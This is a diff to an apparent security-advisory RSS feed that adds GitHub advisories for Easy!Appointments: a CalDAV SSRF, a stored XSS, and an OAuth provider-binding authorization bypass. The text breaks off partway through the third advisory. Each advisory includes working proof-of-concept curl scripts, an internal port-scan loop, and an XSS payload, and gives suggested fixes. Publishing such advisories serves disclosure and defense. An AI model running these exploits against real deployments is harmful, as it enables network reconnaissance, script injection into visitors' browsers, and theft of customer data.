@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://azu.github.io/github-advisory-database-rss/composer.rss</id>
     <title>Security Advisory for PHP packages hosted at packagist.org</title>
-    <updated>2026-11-10T16:40:00.188Z</updated>
+    <updated>2026-11-10T22:00:36.170Z</updated>
     <generator>github-advisory-database-rss</generator>
     <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Acomposer"/>
     <subtitle>Security Advisory for PHP packages hosted at packagist.org on GitHub</subtitle>
@@ -11,6 +11,595 @@
     <category term="HIGH"/>
     <category term="MODERATE"/>
     <category term="LOW"/>
+    <entry>
+        <title type="html"><![CDATA[[alextselegidis/easyappointments] Easy!Appointments has server-side request forgery in CalDAV connection test that exposes the deployment's internal network]]></title>
+        <id>https://github.com/advisories/GHSA-pm5p-7w5h-jm5q</id>
+        <link href="https://github.com/advisories/GHSA-pm5p-7w5h-jm5q"/>
+        <updated>2026-11-10T19:27:30.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p><code>Caldav::connect_to_server</code> at <code>application/controllers/Caldav.php:60</code> hands the request's <code>caldav_url</code> to a Guzzle <code>REPORT</code> call without scheme or host validation. A logged-in backend user (admin, provider, or secretary) reaches loopback, RFC1918, and link-local hosts on the deployment's network. The Guzzle exception path returns the upstream status code plus ~120 bytes of response body in the JSON <code>message</code> field (<code>Caldav.php:74-78</code>), so the SSRF is semi-blind.</p>
+<h3 id="preconditions">Preconditions</h3>
+<ul>
+<li>Backend login on the target instance. Non-admin attackers supply their own <code>provider_id</code> and pass the per-row check at <code>Caldav.php:52</code>; admins can target any row.</li>
+<li>Default deployment per the project's own <code>docker-compose.yml</code>, which puts <code>mysql</code>, <code>mailpit</code>, <code>phpmyadmin</code>, <code>baikal</code>, <code>openldap</code>, <code>phpldapadmin</code>, and <code>swagger-ui</code> on the same docker network as <code>php-fpm</code>.</li>
+</ul>
+<h3 id="details">Details</h3>
+<pre><code class="language-php">// application/controllers/Caldav.php:45-82
+public function connect_to_server(): void
+{
+    try {
+        $provider_id = request('provider_id');
+        $user_id = session('user_id');
+
+        if (cannot('edit', PRIV_USERS) &amp;&amp; (int) $user_id !== (int) $provider_id) {
+            throw new RuntimeException('You do not have the required permissions for this task.');
+        }
+
+        $caldav_url = request('caldav_url');                                  // (*) attacker-controlled
+        $caldav_username = request('caldav_username');
+        $caldav_password = request('caldav_password');
+
+        $this-&gt;caldav_sync-&gt;test_connection($caldav_url, $caldav_username, $caldav_password);  // (*) sink
+        ...
+    } catch (GuzzleException | InvalidArgumentException $e) {
+        json_response([
+            'success' =&gt; false,
+            'message' =&gt; $e-&gt;getMessage(),                                    // (*) upstream body reflected
+        ]);
+    }
+}
+</code></pre>
+<p>The per-row check at line 52 only constrains <em>which provider record</em> the caller may write to; it does not constrain <em>where the outbound request lands</em>. <code>$caldav_url</code> flows unchanged into <code>Caldav_sync::test_connection</code> at <code>application/libraries/Caldav_sync.php:389</code>, which calls <code>get_http_client</code> to construct a Guzzle client whose <code>base_uri</code> is the attacker URL (<code>Caldav_sync.php:375-382</code>), then issues <code>REPORT</code> against it via <code>fetch_events</code> at <code>Caldav_sync.php:558</code>. The only input check in <code>get_http_client</code> is <code>filter_var($caldav_url, FILTER_VALIDATE_URL)</code> at line 363, which validates the URL grammar - not the host - so loopback, RFC1918, link-local, and arbitrary internal hostnames pass.</p>
+<p>When Guzzle raises <code>RequestException</code>, its <code>getMessage()</code> formats as <code>Client error: `REPORT http://target/` resulted in a `405 Method Not Allowed` response: &lt;body truncated to ~120 chars&gt;</code>. <code>Caldav::connect_to_server</code> returns that string verbatim in <code>message</code>. For <code>ConnectException</code> (port closed, DNS failure, TLS handshake error) the message names the host, port, and underlying cURL error number - enough to port-scan the deployment's network.</p>
+<h3 id="proof-of-concept">Proof of concept</h3>
+<p><strong>Setup</strong></p>
+<ol>
+<li><p>Clone the repository, pin to the audited release, copy the sample config, and bring up the bundled stack:</p>
+<pre><code class="language-bash">git clone https://github.com/alextselegidis/easyappointments
+cd easyappointments
+git checkout 1.5.2
+cp config-sample.php config.php
+docker compose up -d
+until curl -fsS http://localhost/ -o /dev/null; do sleep 2; done
+</code></pre>
+</li>
+<li><p>Run the console installer. The seed sets administrator's password to the literal string <code>administrator</code> (<code>application/libraries/Instance.php:99</code>):</p>
+<pre><code class="language-bash">docker compose exec -T php-fpm php index.php console install
+</code></pre>
+</li>
+<li><p>Log in as <code>administrator</code> (the project's session cookie is <code>ea_session</code>) and create an attacker provider. The default <code>require_phone_number=1</code> setting makes <code>phone_number</code> mandatory:</p>
+<pre><code class="language-bash">export ADMIN_JAR=/tmp/admin.cookies
+curl -s -c $ADMIN_JAR http://localhost/index.php/login -o /dev/null
+CSRF=$(awk '$6=="csrf_cookie"{print $7}' $ADMIN_JAR)
+curl -s -b $ADMIN_JAR -c $ADMIN_JAR -X POST http://localhost/index.php/login/validate \
+  --data-urlencode "csrf_token=$CSRF" \
+  --data-urlencode "username=administrator" \
+  --data-urlencode "password=administrator" &gt; /dev/null
+
+CSRF=$(awk '$6=="csrf_cookie"{print $7}' $ADMIN_JAR)
+curl -s -b $ADMIN_JAR -X POST http://localhost/index.php/providers/store \
+  --data-urlencode "csrf_token=$CSRF" \
+  --data-urlencode 'provider[first_name]=Mal' \
+  --data-urlencode 'provider[last_name]=Lory' \
+  --data-urlencode 'provider[email]=mallory@x.test' \
+  --data-urlencode 'provider[phone_number]=+10000000000' \
+  --data-urlencode 'provider[timezone]=UTC' \
+  --data-urlencode 'provider[language]=english' \
+  --data-urlencode 'provider[settings][username]=mallory' \
+  --data-urlencode 'provider[settings][password]=Attacker-pw-1' \
+  --data-urlencode 'provider[settings][notifications]=0'
+export ATTACKER_ID=$(docker compose exec -T mysql mysql -uuser -ppassword easyappointments -N -B \
+  -e "SELECT u.id FROM ea_users u JOIN ea_user_settings s ON s.id_users=u.id WHERE s.username='mallory'")
+</code></pre>
+</li>
+<li><p>Log in as the attacker into a dedicated cookie jar:</p>
+<pre><code class="language-bash">export ATTACKER_JAR=/tmp/attacker.cookies
+curl -s -c $ATTACKER_JAR http://localhost/index.php/login -o /dev/null
+CSRF=$(awk '$6=="csrf_cookie"{print $7}' $ATTACKER_JAR)
+curl -s -b $ATTACKER_JAR -c $ATTACKER_JAR -X POST http://localhost/index.php/login/validate \
+  --data-urlencode "csrf_token=$CSRF" \
+  --data-urlencode "username=mallory" \
+  --data-urlencode "password=Attacker-pw-1" &gt; /dev/null
+</code></pre>
+</li>
+</ol>
+<p><strong>Exploit</strong></p>
+<ol>
+<li><p>The attacker probes the <code>nginx</code> container that fronts Easy!Appointments itself, hitting a 404 path. They pass their own <code>$ATTACKER_ID</code> so the row-ownership check at <code>Caldav.php:52</code> succeeds; the URL has nothing to do with the row:</p>
+<pre><code class="language-bash">CSRF=$(awk '$6=="csrf_cookie"{print $7}' $ATTACKER_JAR)
+curl -s -b $ATTACKER_JAR -X POST http://localhost/index.php/caldav/connect_to_server \
+  --data-urlencode "csrf_token=$CSRF" \
+  --data-urlencode "provider_id=$ATTACKER_ID" \
+  --data-urlencode "caldav_url=http://nginx/some/404/path" \
+  --data-urlencode "caldav_username=x" \
+  --data-urlencode "caldav_password=x"
+</code></pre>
+<p>Observed (verified on a fresh <code>docker compose up</code>): <code>{"success":false,"message":"Client error: \</code>REPORT http://nginx/some/404/path/` resulted in a `404 Not Found` response:\n\n\n&lt;html lang="en" style="\n    height: 100%;\n"&gt;\n\n    &lt;meta charset="utf-8"&gt;\n    &lt;meta http-equiv="X- (truncated...)\n"}` - the upstream HTTP status and the first chunk of the response body are reflected in the JSON.</p>
+</li>
+<li><p>The attacker scans the docker network. Each target produces a distinct exception shape that fingerprints the service. The maintainer can paste the loop verbatim:</p>
+<pre><code class="language-bash">for target in mysql:3306 swagger-ui:8080 mailpit:8025 phpmyadmin nonexistent.invalid; do
+  CSRF=$(awk '$6=="csrf_cookie"{print $7}' $ATTACKER_JAR)
+  printf '\n=== %s ===\n' "$target"
+  curl -s -b $ATTACKER_JAR -X POST http://localhost/index.php/caldav/connect_to_server \
+    --data-urlencode "csrf_token=$CSRF" \
+    --data-urlencode "provider_id=$ATTACKER_ID" \
+    --data-urlencode "caldav_url=http://$target/" \
+    --data-urlencode "caldav_username=x" \
+    --data-urlencode "caldav_password=x"
+done
+</code></pre>
+<p>Observed: <code>mysql:3306</code> returns <code>cURL error 1: Received HTTP/0.9 when not allowed</code> - port open, not HTTP. <code>swagger-ui:8080</code> returns <code>Client error: \</code>REPORT <a href="http://swagger-ui:8080/%5C%60">http://swagger-ui:8080/\`</a> resulted in a `405 Not Allowed` response: \r\n<title>405 Not Allowed</title>...<code>- port open, HTTP, nginx fronts it.</code>mailpit:8025<code>and</code>phpmyadmin<code>(port 80) return</code>{"success":true}<code>- port open, HTTP, the CalDAV</code>REPORT<code>was accepted without a 4xx.</code>nonexistent.invalid<code>returns</code>cURL error 6: Could not resolve host`. Each shape lets the attacker enumerate which internal services exist.</p>
+</li>
+</ol>
+<h3 id="impact">Impact</h3>
+<ul>
+<li><strong>Confidentiality:</strong> Reaches arbitrary HTTP and HTTPS hosts reachable from the <code>php-fpm</code> container, including loopback, the docker network's <code>mysql</code>, <code>mailpit</code>, <code>phpmyadmin</code>, <code>baikal</code>, <code>openldap</code> services, and any RFC1918 / link-local IP on the host network.</li>
+<li><strong>Confidentiality:</strong> Reads up to ~120 bytes of each upstream HTTP response and the exact connection-failure reason via the JSON <code>message</code> field, enough to fingerprint internal services and read short error pages, banners, or status documents.</li>
+</ul>
+<h3 id="suggestions-to-fix">Suggestions to fix</h3>
+<blockquote>
+<p><em>This has not been tested - it is illustrative only.</em></p>
+</blockquote>
+<p>Reject non-<code>http</code>/<code>https</code> schemes and resolved private addresses before constructing the Guzzle client.</p>
+<pre><code class="language-diff">         $caldav_url = request('caldav_url');
++
++        $scheme = parse_url($caldav_url, PHP_URL_SCHEME);
++        $host   = parse_url($caldav_url, PHP_URL_HOST) ?: '';
++        $ip     = filter_var($host, FILTER_VALIDATE_IP) ?: gethostbyname($host);
++
++        if (!in_array($scheme, ['http', 'https'], true) || $ip === '' || $ip === $host
++            || !filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) {
++            throw new InvalidArgumentException('CalDAV URL is not allowed.');
++        }
++
+         $caldav_username = request('caldav_username');
+         $caldav_password = request('caldav_password');
+
+         $this-&gt;caldav_sync-&gt;test_connection($caldav_url, $caldav_username, $caldav_password);
+</code></pre>
+<h3 id="credit">Credit</h3>
+<p>Dredsen, 2026.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/alextselegidis/easyappointments/security/advisories/GHSA-pm5p-7w5h-jm5q">https://github.com/alextselegidis/easyappointments/security/advisories/GHSA-pm5p-7w5h-jm5q</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-52840">https://nvd.nist.gov/vuln/detail/CVE-2026-52840</a></li>
+<li><a href="https://github.com/alextselegidis/easyappointments/commit/2da2baed18ec32ad7916e507815709c8f010d510">https://github.com/alextselegidis/easyappointments/commit/2da2baed18ec32ad7916e507815709c8f010d510</a></li>
+<li><a href="https://github.com/alextselegidis/easyappointments/commit/4abb10545d83ac1a57d03f6502376ee67696ea7c">https://github.com/alextselegidis/easyappointments/commit/4abb10545d83ac1a57d03f6502376ee67696ea7c</a></li>
+<li><a href="https://github.com/alextselegidis/easyappointments/commit/6b34b78c47790dfd1dec27cf62926db51be276e9">https://github.com/alextselegidis/easyappointments/commit/6b34b78c47790dfd1dec27cf62926db51be276e9</a></li>
+<li><a href="https://github.com/alextselegidis/easyappointments/commit/6eb9336a91cfb276379506625e81f5bd9ed3a536">https://github.com/alextselegidis/easyappointments/commit/6eb9336a91cfb276379506625e81f5bd9ed3a536</a></li>
+<li><a href="https://github.com/alextselegidis/easyappointments/releases/tag/1.6.0">https://github.com/alextselegidis/easyappointments/releases/tag/1.6.0</a></li>
+<li><a href="https://github.com/advisories/GHSA-pm5p-7w5h-jm5q">https://github.com/advisories/GHSA-pm5p-7w5h-jm5q</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-pm5p-7w5h-jm5q</uri>
+        </author>
+        <category label="severity" term="LOW"/>
+        <published>2026-07-29T16:24:27.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[alextselegidis/easyappointments] Easy!Appointments disable_booking_message rendered as raw HTML on public booking page — Stored XSS]]></title>
+        <id>https://github.com/advisories/GHSA-996f-334j-67g7</id>
+        <link href="https://github.com/advisories/GHSA-996f-334j-67g7"/>
+        <updated>2026-11-10T19:26:10.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
+<h2 id="easyappointments-allows-administrators-to-define-a-custom-booking-disabled-message-through-the-booking-settings-page-that-value-is-stored-in-the-disable_booking_message-setting-via-a-rich-text-editor-and-later-passed-directly-to-the-public-booking_message-view-without-escaping-or-sanitization---php-p-varsmessage_text-p----an-authenticated-administrator-can-store-html-or-javascript-in-this-field-enable-disabled-booking-mode-and-trigger-stored-xss-in-every-unauthenticated-visitor-who-opens-the-public-booking-page">Easy!Appointments allows administrators to define a custom "booking disabled" message through the booking settings page. That value is stored in the <code>disable_booking_message</code> setting via a rich-text editor and later passed directly to the public <code>booking_message</code> view without escaping or sanitization:
+ 
+<code>php &lt;p&gt;&lt;?= vars('message_text') ?&gt;&lt;/p&gt; </code>
+ 
+An authenticated administrator can store HTML or JavaScript in this field, enable disabled-booking mode, and trigger stored XSS in every unauthenticated visitor who opens the public booking page.
+ </h2>
+<h2 id="root-cause--step-by-step-code-flow">Root Cause — Step by Step Code Flow</h2>
+<h3 id="step-1--rich-text-editor-value-stored-without-sanitization">Step 1 — Rich text editor value stored without sanitization</h3>
+<h2 id="the-booking-settings-page-collects-the-message-value-from-the-trumbowyg-rich-text-editor-and-submits-it-as-raw-html---javascript--assetsjspagesbooking_settingsjs-line-61-92-bookingsettingspush-----name-disable_booking_message-----value-disablebookingmessagetrumbowyghtml------step-2--settings-controller-saves-value-verbatim-the-backend-settings-controller-persists-the-submitted-value-without-any-html-sanitization---php--applicationcontrollersbooking_settingsphp-line-76-104-this-settings_model-savesetting-----step-3--public-booking-controller-forwards-stored-value-to-view-when-booking-is-disabled-the-public-booking-controller-loads-the-stored-message-and-passes-it-directly-to-the-view---php--applicationcontrollersbookingphp-line-113-132-disable_booking_message--settingdisable_booking_message---html_vars-----message_text--disable_booking_message------step-4--public-view-renders-value-without-escaping-the-booking-message-view-emits-the-value-raw-using-phps-short-echo-tag-with-no-escaping---php--applicationviewspagesbooking_messagephp-line-10-12-p-varsmessage_text-p----no-htmlspecialchars-no-sanitization-no-template-escaping-is-applied-at-any-point-in-this-rendering-path">The booking settings page collects the message value from the Trumbowyg rich-text editor and submits it as raw HTML:
+ 
+<code>javascript // assets/js/pages/booking_settings.js line 61-92 bookingSettings.push({     name: 'disable_booking_message',     value: $disableBookingMessage.trumbowyg('html'), }); </code>
+ 
+### Step 2 — Settings controller saves value verbatim
+The backend settings controller persists the submitted value without any HTML sanitization:
+ 
+<code>php // application/controllers/Booking_settings.php line 76-104 $this-&gt;settings_model-&gt;save($setting); </code>
+ 
+### Step 3 — Public booking controller forwards stored value to view
+When booking is disabled, the public booking controller loads the stored message and passes it directly to the view:
+ 
+<code>php // application/controllers/Booking.php line 113-132 $disable_booking_message = setting('disable_booking_message');   html_vars([     'message_text' =&gt; $disable_booking_message, ]); </code>
+ 
+### Step 4 — Public view renders value without escaping
+The booking message view emits the value raw using PHP's short echo tag with no escaping:
+ 
+<code>php // application/views/pages/booking_message.php line 10-12 &lt;p&gt;&lt;?= vars('message_text') ?&gt;&lt;/p&gt; </code>
+ 
+No <code>htmlspecialchars()</code>, no sanitization, no template escaping is applied at any point in this rendering path.
+ </h2>
+<h2 id="proof-of-concept">Proof of Concept</h2>
+<h2 id="step-1--store-malicious-disabled-booking-message-as-admin---http-post-indexphpbooking_settingssave-http11-host-12700118094-cookie-admin-session-cookie-content-type-applicationx-www-form-urlencoded---csrf_tokentokenbooking_settings0namedisable_bookingbooking_settings0value1booking_settings1namedisable_booking_messagebooking_settings1valueimg-srcx-onerroralerteasyappointments-xss-by-ashrexon----response-200-ok--settings-saved-successfully---step-2--unauthenticated-visitor-opens-public-booking-page---http-get--http11-host-12700118094-no-authentication----observed-response-fragment-html-pimg-srcx-onerroralerteasyappointments-xss-by-ashrexonp----observed-browser-behavior---alerteasyappointments-xss-by-ashrexon-executes-immediately-on-page-load-with-no-authentication-required-confirmed-via-browser-screenshot-attached-as-comment---runtime-verification-result-admin-login-ok-settings-save-ok-payload-reflected-on-public-page-pass"><strong>Step 1 — Store malicious disabled-booking message as admin:</strong>
+ 
+<code>http POST /index.php/booking_settings/save HTTP/1.1 Host: 127.0.0.1:18094 Cookie: &lt;admin-session-cookie&gt; Content-Type: application/x-www-form-urlencoded   csrf_token=&lt;token&gt;&amp;booking_settings[0][name]=disable_booking&amp;booking_settings[0][value]=1&amp;booking_settings[1][name]=disable_booking_message&amp;booking_settings[1][value]=&lt;img src=x onerror=alert("easyappointments xss by ashrexon")&gt; </code>
+ 
+Response: <code>200 OK</code> — settings saved successfully
+ 
+<strong>Step 2 — Unauthenticated visitor opens public booking page:</strong>
+ 
+<code>http GET / HTTP/1.1 Host: 127.0.0.1:18094 (no authentication) </code>
+ 
+<strong>Observed response fragment:</strong>
+<code>html &lt;p&gt;&lt;img src=x onerror=alert("easyappointments xss by ashrexon")&gt;&lt;/p&gt; </code>
+ 
+<strong>Observed browser behavior:</strong>
+ 
+<code>alert("easyappointments xss by ashrexon")</code> executes immediately on page load with no authentication required. Confirmed via browser screenshot attached as comment.
+ 
+<strong>Runtime verification result:</strong>
+<code>admin login ok settings save ok payload reflected on public page PASS</code>
+ </h2>
+<h2 id="real-world-impact">Real World Impact</h2>
+<h2 id="easyappointments-is-deployed-as-a-public-facing-appointment-booking-surface-for-businesses-clinics-and-service-providers-an-administrator-can-abuse-the-disabled-booking-message--a-customer-facing-feature-intended-for-maintenance-or-holiday-notices--to-plant-javascript-that-executes-in-every-visitors-browser-when-the-booking-page-is-disabled-this-can-be-used-to-----execute-arbitrary-javascript-in-visitor-browsers-on-the-trusted-booking-domain---phish-visitor-credentials-or-personal-information-during-booking-downtime---deface-the-public-booking-page-during-maintenance-or-outage-windows---redirect-visitors-to-attacker-controlled-sites">Easy!Appointments is deployed as a public-facing appointment booking surface for businesses, clinics, and service providers. An administrator can abuse the disabled-booking message — a customer-facing feature intended for maintenance or holiday notices — to plant JavaScript that executes in every visitor's browser when the booking page is disabled. This can be used to:
+ 
+- Execute arbitrary JavaScript in visitor browsers on the trusted booking domain
+- Phish visitor credentials or personal information during booking downtime
+- Deface the public booking page during maintenance or outage windows
+- Redirect visitors to attacker-controlled sites</h2>
+<h2 id="suggested-fix">Suggested Fix</h2>
+<h2 id="escape-the-message-value-before-rendering-in-the-view---php--applicationviewspagesbooking_messagephp-p-evarsmessage_text-p----alternatively-apply-a-strict-html-sanitizer-allowing-only-safe-formatting-tags-no-event-handlers-or-script-elements-to-the-disable_booking_message-value-before-storage-or-before-rendering-to-preserve-intended-rich-text-formatting-while-preventing-script-injection">Escape the message value before rendering in the view:
+ 
+<code>php // application/views/pages/booking_message.php &lt;p&gt;&lt;?= e(vars('message_text')) ?&gt;&lt;/p&gt; </code>
+ 
+Alternatively apply a strict HTML sanitizer (allowing only safe formatting tags, no event handlers or script elements) to the <code>disable_booking_message</code> value before storage or before rendering, to preserve intended rich-text formatting while preventing script injection.
+ </h2>
+<h2 id="reporter">Reporter</h2>
+<p><strong>Yash Shendge (ashrexon)</strong>
+2026-05-25</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/alextselegidis/easyappointments/security/advisories/GHSA-996f-334j-67g7">https://github.com/alextselegidis/easyappointments/security/advisories/GHSA-996f-334j-67g7</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-52838">https://nvd.nist.gov/vuln/detail/CVE-2026-52838</a></li>
+<li><a href="https://github.com/alextselegidis/easyappointments/commit/629a0415f54f75556c17f4f5d9c77fda1fdbdeae">https://github.com/alextselegidis/easyappointments/commit/629a0415f54f75556c17f4f5d9c77fda1fdbdeae</a></li>
+<li><a href="https://github.com/alextselegidis/easyappointments/releases/tag/1.6.0">https://github.com/alextselegidis/easyappointments/releases/tag/1.6.0</a></li>
+<li><a href="https://github.com/advisories/GHSA-996f-334j-67g7">https://github.com/advisories/GHSA-996f-334j-67g7</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-996f-334j-67g7</uri>
+        </author>
+        <category label="severity" term="LOW"/>
+        <published>2026-07-29T16:30:09.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[alextselegidis/easyappointments] Easy!Appointments: Authorization bypass in Google OAuth provider binding lets any backend user rebind a peer provider's Google sync]]></title>
+        <id>https://github.com/advisories/GHSA-8hm4-r66f-29wr</id>
+        <link href="https://github.com/advisories/GHSA-8hm4-r66f-29wr"/>
+        <updated>2026-11-10T19:25:42.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p><code>Google::oauth</code> at <code>application/controllers/Google.php:278</code> stores its URL-supplied <code>provider_id</code> in the session, and <code>oauth_callback</code> saves the issued Google OAuth token against that row without checking the caller owns the provider. Any logged-in backend user (admin, provider, or secretary) rebinds a peer provider's Google sync to a Google account they control. The peer's appointments then sync into the attacker's calendar with each customer's name and email attached as attendee data.</p>
+<h3 id="preconditions">Preconditions</h3>
+<ul>
+<li>Attacker holds a backend login on the target instance (admin, provider, or secretary). The customer role cannot log in.</li>
+<li>The instance has Google Calendar OAuth configured at <code>application/config/google.php</code> - i.e. any deployment that uses the Google sync feature at all.</li>
+<li>Default deployment per the project's own <code>docker-compose.yml</code>; no non-default flags required.</li>
+</ul>
+<h3 id="details">Details</h3>
+<pre><code class="language-php">// application/controllers/Google.php:278-289
+public function oauth(string $provider_id): void
+{
+    if (!$this-&gt;session-&gt;userdata('user_id')) {
+        show_error('Forbidden', 403);
+    }
+
+    // Store the provider id for use on the callback function.
+    session(['oauth_provider_id' =&gt; $provider_id]);                       // (*) attacker-chosen id stored unchecked
+
+    // Redirect browser to google user content page.
+    header('Location: ' . $this-&gt;google_sync-&gt;get_auth_url());
+}
+</code></pre>
+<pre><code class="language-php">// application/controllers/Google.php:305-337
+public function oauth_callback(): void
+{
+    if (!session('user_id')) {
+        abort(403, 'Forbidden');
+    }
+
+    $code = request('code');
+    if (empty($code)) { response('Code authorization failed.'); return; }
+
+    $token = $this-&gt;google_sync-&gt;authenticate($code);
+    if (empty($token)) { response('Token authorization failed.'); return; }
+
+    $oauth_provider_id = session('oauth_provider_id');
+    if ($oauth_provider_id) {
+        $this-&gt;providers_model-&gt;set_setting($oauth_provider_id, 'google_sync', true);                  // (*)
+        $this-&gt;providers_model-&gt;set_setting($oauth_provider_id, 'google_token', json_encode($token));  // (*)
+        $this-&gt;providers_model-&gt;set_setting($oauth_provider_id, 'google_calendar', 'primary');
+    } else {
+        response('Sync provider id not specified.');
+    }
+}
+</code></pre>
+<p>The same controller already carries the right gate on every other sync-management entry. <code>select_google_calendar</code> at <code>application/controllers/Google.php:389</code> and <code>disable_provider_sync</code> at <code>application/controllers/Google.php:423</code> both refuse the call when the caller is neither an admin nor the provider themselves:</p>
+<pre><code class="language-php">// application/controllers/Google.php:389
+if (cannot('edit', PRIV_USERS) &amp;&amp; (int) $user_id !== (int) $provider_id) {
+    throw new RuntimeException('You do not have the required permissions for this task.');
+}
+</code></pre>
+<p><code>oauth</code> and <code>oauth_callback</code> skip that check. Once the callback runs with <code>oauth_provider_id</code> pointing at a peer provider, the peer's <code>user_settings</code> row is overwritten with the attacker's OAuth token and <code>google_sync</code> is forcibly enabled.</p>
+<p>The attack chain that delivers the data:</p>
+<ul>
+<li><code>Synchronization::sync_appointment_saved</code> at <code>application/libraries/Synchronization.php:51</code> runs on every booking save. The path includes the unauthenticated public booking flow (<code>Booking::register</code> at <code>application/controllers/Booking.php:463</code>) and the backend save (<code>Calendar::save_appointment</code> at <code>application/controllers/Calendar.php:306</code>). When <code>$provider['settings']['google_sync']</code> is truthy the handler reads <code>google_token</code> from the row - now the attacker's - refreshes it, and calls <code>Google_sync::add_appointment</code>.</li>
+<li><code>Google_sync::add_appointment</code> at <code>application/libraries/Google_sync.php:184-189</code> adds the customer as a Google calendar attendee with their first name, last name, and email.</li>
+<li>The cron-triggered <code>Console::sync</code> -&gt; <code>Google::sync($provider_id)</code> at <code>application/controllers/Google.php:44</code> walks the existing <code>sync_past_days</code> and <code>sync_future_days</code> windows and pushes every appointment to the attacker's calendar.</li>
+<li>The same loop deletes the local row whenever the remote event throws or is <code>cancelled</code> (<code>application/controllers/Google.php:186-191</code>); the attacker rolls events out of their Google calendar to delete the victim provider's appointments. Events the attacker creates in their own calendar arrive as unavailability records on the victim's schedule (<code>application/controllers/Google.php:209-254</code>).</li>
+</ul>
+<h3 id="proof-of-concept">Proof of concept</h3>
+<p><strong>Setup</strong></p>
+<ol>
+<li><p>Clone the repository, pin to the audited release, copy the sample config, and bring up the bundled stack:</p>
+<pre><code class="language-bash">git clone https://github.com/alextselegidis/easyappointments
+cd easyappointments
+git checkout 1.5.2
+cp config-sample.php config.php
+docker compose up -d
+until curl -fsS http://localhost/ -o /dev/null; do sleep 2; done
+</code></pre>
+</li>
+<li><p>Run the console installer. The seed sets administrator's password to the literal string <code>administrator</code> (see <code>application/libraries/Instance.php:99</code>):</p>
+<pre><code class="language-bash">docker compose exec -T php-fpm php index.php console install
+</code></pre>
+</li>
+<li><p>Configure the install's Google OAuth client. Paste the client id and secret from a Google Cloud project you control into <code>application/config/google.php</code> and add <code>http://localhost/index.php/google/oauth_callback</code> to the project's authorized redirect URIs. This step is already done on any deployment that uses Google sync.</p>
+</li>
+<li><p>Log in as <code>administrator</code> and persist the cookie jar (the project's session cookie is <code>ea_session</code>):</p>
+<pre><code class="language-bash">export ADMIN_JAR=/tmp/admin.cookies
+curl -s -c $ADMIN_JAR http://localhost/index.php/login -o /dev/null
+CSRF=$(awk '$6=="csrf_cookie"{print $7}' $ADMIN_JAR)
+curl -s -b $ADMIN_JAR -c $ADMIN_JAR -X POST http://localhost/index.php/login/validate \
+  --data-urlencode "csrf_token=$CSRF" \
+  --data-urlencode "username=administrator" \
+  --data-urlencode "password=administrator" &gt; /dev/null
+</code></pre>
+</li>
+<li><p>Create the attacker provider (the default <code>require_phone_number=1</code> setting makes that field mandatory). Capture both ids:</p>
+<pre><code class="language-bash">CSRF=$(awk '$6=="csrf_cookie"{print $7}' $ADMIN_JAR)
+curl -s -b $ADMIN_JAR -X POST http://localhost/index.php/providers/store \
+  --data-urlencode "csrf_token=$CSRF" \
+  --data-urlencode 'provider[first_name]=Mal' \
+  --data-urlencode 'provider[last_name]=Lory' \
+  --data-urlencode 'provider[email]=mallory@x.test' \
+  --data-urlencode 'provider[phone_number]=+10000000000' \
+  --data-urlencode 'provider[timezone]=UTC' \
+  --data-urlencode 'provider[language]=english' \
+  --data-urlencode 'provider[settings][username]=mallory' \
+  --data-urlencode 'provider[settings][password]=Attacker-pw-1' \
+  --data-urlencode 'provider[settings][notifications]=0'
+export ATTACKER_ID=$(docker compose exec -T mysql mysql -uuser -ppassword easyappointments -N -B \
+  -e "SELECT u.id FROM ea_users u JOIN ea_user_settings s ON s.id_users=u.id WHERE s.username='mallory'")
+export VICTIM_ID=$(docker compose exec -T mysql mysql -uuser -ppassword easyappointments -N -B \
+  -e "SELECT u.id FROM ea_users u JOIN ea_user_settings s ON s.id_users=u.id WHERE s.username='janedoe'")
+</code></pre>
+</li>
+<li><p>Log in as the attacker provider into a dedicated cookie jar:</p>
+<pre><code class="language-bash">export ATTACKER_JAR=/tmp/attacker.cookies
+curl -s -c $ATTACKER_JAR http://localhost/index.php/login -o /dev/null
+CSRF=$(awk '$6=="csrf_cookie"{print $7}' $ATTACKER_JAR)
+curl -s -b $ATTACKER_JAR -c $ATTACKER_JAR -X POST http://localhost/index.php/login/validate \
+  --data-urlencode "csrf_token=$CSRF" \
+  --data-urlencode "username=mallory" \
+  --data-urlencode "password=Attacker-pw-1" &gt; /dev/null
+</code></pre>
+</li>
+</ol>
+<p><strong>Exploit</strong></p>
+<ol>
+<li><p>The attacker, logged in as a regular provider with id <code>$ATTACKER_ID</code>, points <code>/google/oauth/</code> at the victim provider's id <code>$VICTIM_ID</code>:</p>
+<pre><code class="language-bash">curl -si -b $ATTACKER_JAR "http://localhost/index.php/google/oauth/$VICTIM_ID" | head -5
+</code></pre>
+<p>Expected: <code>HTTP/1.1 302 Found</code> with <code>Location: https://accounts.google.com/o/oauth2/auth?...</code> - the server accepted the call from a non-owning caller. Verify the session-side effect on disk: <code>docker compose exec -T php-fpm cat storage/sessions/ea_session$(awk '$6=="ea_session"{print $7}' $ATTACKER_JAR)</code> shows <code>oauth_provider_id|s:1:"&lt;VICTIM_ID&gt;"</code> appended to the attacker's session data alongside their own <code>user_id|i:&lt;ATTACKER_ID&gt;</code>.</p>
+</li>
